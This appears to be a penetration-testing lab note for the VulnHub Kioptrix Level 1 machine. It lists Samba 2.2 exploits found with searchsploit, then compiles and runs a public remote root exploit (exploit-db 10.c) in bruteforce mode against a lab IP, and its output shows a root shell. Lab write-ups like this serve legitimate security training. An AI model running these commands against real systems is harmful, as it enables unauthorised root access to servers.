└─# searchsploit -w samba 2.2 Linux

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------

Exploit Title                                                                                                                                                                                 |  URL

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------

Samba 2.2.2 \< 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                                                                        | https://www.exploit-db.com/exploits/16321

Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                                                                | https://www.exploit-db.com/exploits/23674

Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                            | https://www.exploit-db.com/exploits/16861

Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                                                                                      | https://www.exploit-db.com/exploits/55

Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                                                                           | https://www.exploit-db.com/exploits/9936

Samba 2.2.x - Remote Buffer Overflow                                                                                                                                                           | https://www.exploit-db.com/exploits/7

Samba \< 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                                              | https://www.exploit-db.com/exploits/10

Samba \< 3.0.20 - Remote Heap Overflow                                                                                                                                                          | https://www.exploit-db.com/exploits/7701

Samba \< 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                  | https://www.exploit-db.com/exploits/36741

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------

Shellcodes: No Results

![[Initial Access image 38.png]]

└─#  cp /usr/share/exploitdb/exploits/multiple/remote/10.c 10.c

┌──(root㉿kali)-\[/home/kali/vulnhub/Kioptrix_Level1\]

└─# gcc 10.c -o 10

![[Initial Access image 39.png]]

└─# ./10

samba-2.2.8 \< remote root exploit by eSDee (www.netric.org|be)

\--------------------------------------------------------------

Usage: ./10 \[-bBcCdfprsStv\] \[host\]

-b \<platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)

-B \<step>       bruteforce steps (default = 300)

-c \<ip address> connectback ip address

-C \<max childs> max childs for scan/bruteforce mode (default = 40)

-d \<delay>      bruteforce/scanmode delay in micro seconds (default = 100000)

-f              force

-p \<port>       port to attack (default = 139)

-r \<ret>        return address

-s              scan mode (random)

-S \<network>    scan mode

-t \<type>       presets (0 for a list)

-v              verbose mode

![[Initial Access image 40.png]]

└─# ./10 -b 0 192.168.133.129

samba-2.2.8 \< remote root exploit by eSDee (www.netric.org|be)

\--------------------------------------------------------------

\+ Bruteforce mode. (Linux)

\+ Host is running samba.

\+ Worked!

\--------------------------------------------------------------

*** JE MOET JE MUIL HOUWE

Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown

uid=0(root) gid=0(root) groups=99(nobody)

whoami

root

![[Initial Access image 41.png]]